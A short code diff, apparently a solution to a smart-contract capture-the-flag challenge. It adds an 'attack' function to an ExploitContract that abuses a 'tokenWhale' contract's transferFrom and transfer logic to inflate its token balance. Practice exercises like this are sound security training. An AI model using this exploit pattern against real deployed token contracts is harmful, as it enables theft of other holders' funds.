@@ -70,4 +70,8 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+    function attack() external {
+        tokenWhale.transferFrom(msg.sender, msg.sender, 1);
+        tokenWhale.transfer(msg.sender, 1000000);
+    }
 }
